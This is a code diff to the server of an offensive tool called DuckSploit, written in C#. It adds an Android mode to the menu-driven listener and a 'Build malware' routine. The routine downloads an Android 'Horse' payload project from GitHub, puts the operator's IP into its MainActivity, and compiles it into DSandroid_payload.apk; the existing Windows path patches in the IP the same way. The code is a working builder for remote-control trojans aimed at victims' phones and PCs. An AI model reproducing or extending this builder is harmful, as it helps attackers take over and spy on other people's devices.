@@ -196,7 +196,7 @@ namespace DSserver
 			process = Process.Start(processInfo);
 			process.WaitForExit();
 
-			string path = tempdir + "/last.txt";
+			string path = tempdir + "\\last.txt";
 			string readText = File.ReadAllText(path);
 			return readText;
 			
@@ -229,6 +229,9 @@ namespace DSserver
 		}
         static void Main(string[] args)
         {
+			bool android = false;
+			
+			
 			string userprofile = System.Environment.GetEnvironmentVariable("USERPROFILE");
 			string tempdir = Path.GetTempPath(); 
 			string dir = userprofile + "\\DuckSploit"; 
@@ -237,8 +240,31 @@ namespace DSserver
 				Directory.CreateDirectory(dir);
 			}
 			
+			string dir2 = userprofile + "\\DuckSploit\\android"; 
+			if (! Directory.Exists(dir2)) 
+			{
+				Directory.CreateDirectory(dir2);
+			}
+			
+			string androidfilepath = userprofile + "\\DuckSploit\\android\\androidmod.txt"; 
+			if (File.Exists(androidfilepath)) 
+			{
+				android = true;
+			}
+			else
+			{
+				android = false;
+			}
+			
             UDPSocket s = new UDPSocket();
-            s.Server("0.0.0.0", 53);
+			if (android == true)
+			{
+				s.Server("0.0.0.0", 45357);
+			}
+			else
+			{
+				s.Server("0.0.0.0", 53);
+			}
 			int a = 0;
 			while(a == 0)
 			{
@@ -253,14 +279,18 @@ namespace DSserver
 				sendmsg("                                               dP                              ", "green");
 				sendmsg("                            | DuckSploit V1.0.8 |                         ", "green");
 				
+				if (android == true)
+				{
+					sendmsg("> Android Mode enabled", "red");
+				}
 				// # Wait
 				sendmsgnonewline("    [", "yellow");
 				sendmsgnonewline("1", "red");
 				sendmsg("] Wait", "yellow");
-				// # Open chat
+				// # Android mod
 				sendmsgnonewline("    [", "yellow");
 				sendmsgnonewline("2", "red");
-				sendmsg("] Open chat", "yellow");
+				sendmsg("] Toggle android mode", "yellow");
 				// # Build malware
 				sendmsgnonewline("    [", "yellow");
 				sendmsgnonewline("3", "red");
@@ -348,8 +378,41 @@ namespace DSserver
 				}
 				else if(menu == "2")
 				{
+					int c = 0;
 					a = 1;
-					Console.WriteLine("soon");
+					while (c == 0)
+					{
+						sendmsg("To work with android payload, you must use android mode", "red");
+						Console.WriteLine(" ");
+						sendmsgnonewline("Choose option [", "green");
+						sendmsgnonewline("on", "yellow");
+						sendmsgnonewline(",", "red");
+						sendmsgnonewline("off", "yellow");
+						sendmsgnonewline("]: ", "green");
+				
+						string androidoption = Console.ReadLine();
+						if (androidoption == "on")
+						{
+							string someText = "hello there, nothin' to see here :|";
+							File.WriteAllText(androidfilepath, someText);
+							c = 1;
+						}
+						else if (androidoption == "off")
+						{
+							c = 1;
+							try
+							{
+								File.Delete(androidfilepath);
+							}
+							catch (Exception e)
+							{}
+						}
+						else
+						{
+							Console.Clear();
+							sendmsg("[x] Unknown opion", "red");
+						}
+					}
 				}
 				else if(menu == "3")
 				{
@@ -398,12 +461,12 @@ namespace DSserver
 								string myip = Console.ReadLine(); 
 								
 								sendmsg("Downloading executable...", "yellow");
-								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/victim/windows/program.cs", tempdir + "/DSwindows.cs");
+								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/victim/windows/program.cs", tempdir + "\\DSwindows.cs");
 								sendmsg("Downloaded!", "yellow");
 								
-								string text = File.ReadAllText(tempdir + "/DSwindows.cs");
+								string text = File.ReadAllText(tempdir + "\\DSwindows.cs");
 								text = text.Replace("<yourip>", myip);
-								File.WriteAllText(tempdir + "/DSwindows.cs", text);
+								File.WriteAllText(tempdir + "\\DSwindows.cs", text);
 								Console.Clear();
 								sendmsg("Loading...", "yellow");
 								
@@ -431,7 +494,49 @@ namespace DSserver
 						else if(menu2 == "3")
 						{
 							Console.Clear();
-							Console.WriteLine("aaaandroid");
+							
+							if (Directory.Exists(@"C:\\Program Files\\Java")) {
+								sendmsg("[o] java.exe is installed (check if it's version jdk 18)", "yellow");
+								Console.WriteLine(" ");
+								
+								sendmsgnonewline("Enter your ip (ipv4, ipv6 or dns server link allowed): ", "green");
+								string myip = Console.ReadLine(); 
+								
+								sendmsg("Downloading executable... (This may take few minutes)", "yellow");
+								Download("https://github.com/canarddu38/DUCKSPLOIT/raw/root/victim/android/DSpayload.zip", tempdir + "\\DSandroid.zip");
+								execute_cmd("powershell Expand-Archive -Path $env:TEMP\\DSandroid.zip -DestinationPath $env:TEMP\\DSandroid");
+								sendmsg("Downloaded!", "yellow");
+								
+								File.WriteAllText(tempdir + "\\DSandroid\\local.properties", "sdk.dir=" + tempdir + "\\SDK");
+								
+								if (! Directory.Exists(tempdir + "\\SDK"))
+								{
+									sendmsg("Downloading android sdk... (This may take again few minutes)", "yellow");
+									Download("https://drive.google.com/u/2/uc?id=1Wum_1YsoznOib6uVco6u54eTRB_MniF9&export=download&confirm=t&uuid=bdde3053-eb94-4254-b94b-10e8873666f7", tempdir + "\\SDK.zip");
+									execute_cmd("powershell Expand-Archive -Path $env:TEMP\\SDK.zip -DestinationPath $env:TEMP\\SDK");
+									sendmsg("Downloaded!", "yellow");
+								}
+								
+								string text = File.ReadAllText(tempdir + "\\DSandroid\\app\\src\\main\\com\\Duckpvp\\DuckSploit\\Horse\\MainActivity.java");
+								text = text.Replace("<your ip>", myip);
+								File.WriteAllText(tempdir + "\\DSandroid\\app\\src\\main\\com\\Duckpvp\\DuckSploit\\Horse\\MainActivity.java", text);
+								Console.Clear();
+								sendmsg("Loading...", "yellow");
+								
+								execute_cmd("mkdir " + dir + "\\generated");
+								execute_cmd("cd " + tempdir + "\\DSandroid&gradlew assembleDebug&move \"app\\build\\outputs\\debug\\app-debug.apk\" \"" + dir + "\\generated");
+								execute_cmd("rename \"" + dir + "\\generated\\app-debug.apk\" DSandroid_payload.apk");
+								Console.Clear();
+								
+								sendmsg("DS payload is now generated! ", "yellow");
+								sendmsg("Can be found at: " + dir + "\\generated\\DSandroid_payload.apk", "yellow");
+							
+							
+					
+							
+							
+							
+							}
 							b = 1;
 							Console.ReadKey();
 						}
